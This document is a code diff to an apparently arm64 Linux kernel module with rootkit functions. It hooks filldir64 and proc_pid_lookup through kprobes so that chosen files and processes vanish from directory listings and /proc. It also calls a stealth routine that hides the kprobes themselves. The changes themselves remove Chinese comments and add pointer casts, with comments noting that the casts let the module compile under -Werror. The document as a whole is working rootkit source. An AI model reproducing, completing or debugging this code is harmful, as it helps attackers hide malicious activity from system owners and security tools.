@@ -22,7 +22,7 @@
 #include "dirent_hide.h"
 #include "kallsym.h"
 #include "log.h"
-#include "stealth_probe.h" /* 新增：引入探针摘除器 */
+#include "stealth_probe.h"
 
 #define DIRENT_HIDE_NAME_MAX 64u
 #define DIRENT_HIDE_NAME_SLOTS 16u
@@ -44,7 +44,6 @@ static DEFINE_MUTEX(kp_lock);
 static struct kprobe filldir_kp;
 static bool kp_registered;
 
-/* 新增：proc_pid_lookup 拦截器结构 */
 struct dirent_lookup_data { bool block; };
 static struct kretprobe krp_pid_lookup;
 
@@ -151,9 +150,9 @@ spoof:
 	return 1;
 }
 
-/* 新增：proc_pid_lookup 拦截逻辑 */
 static int pid_lookup_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
-	struct dirent_lookup_data *d = ri->data;
+	/* 修复：ri->data 是 char[]，必须强制转换，否则 -Werror 报不兼容指针 */
+	struct dirent_lookup_data *d = (struct dirent_lookup_data *)ri->data;
 	struct dentry *de = (struct dentry *)regs->regs[1];
 	const unsigned char *n; long pid = 0;
 	d->block = false;
@@ -166,7 +165,8 @@ static int pid_lookup_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 }
 
 static int pid_lookup_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
-	struct dirent_lookup_data *d = ri->data;
+	/* 修复：同上，强制转换 */
+	struct dirent_lookup_data *d = (struct dirent_lookup_data *)ri->data;
 	if (d->block) regs->regs[0] = (unsigned long)(-ENOENT);
 	return 0;
 }
@@ -184,18 +184,16 @@ static int dirent_hide_register_kprobe_locked(void) {
 
 	rc = register_kprobe(&filldir_kp);
 	if (rc) return rc;
-	
-	/* 新增：抹除 filldir64 探针结构体 */
+
 	stealth_hide_kprobe(&filldir_kp);
 
-	/* 新增：注册并抹除 proc_pid_lookup 探针 */
 	memset(&krp_pid_lookup, 0, sizeof(krp_pid_lookup));
 	krp_pid_lookup.entry_handler = pid_lookup_entry;
 	krp_pid_lookup.handler = pid_lookup_ret;
 	krp_pid_lookup.data_size = sizeof(struct dirent_lookup_data);
 	krp_pid_lookup.maxactive = 16;
 	krp_pid_lookup.kp.symbol_name = "proc_pid_lookup";
-	
+
 	if (register_kretprobe(&krp_pid_lookup) == 0) {
 		stealth_hide_kprobe(&krp_pid_lookup.kp);
 	}
